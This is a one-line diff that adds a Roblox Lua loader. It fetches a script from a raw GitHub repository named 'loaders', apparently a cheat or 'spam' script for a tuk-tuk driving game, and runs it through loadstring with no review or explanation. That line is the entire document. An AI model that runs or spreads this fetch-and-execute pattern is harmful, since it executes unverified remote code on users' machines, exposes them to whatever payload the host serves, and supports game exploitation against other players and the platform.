@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/drive-a-tuk-tuk-spam4-36dze9hzifuoa2.lua"))()
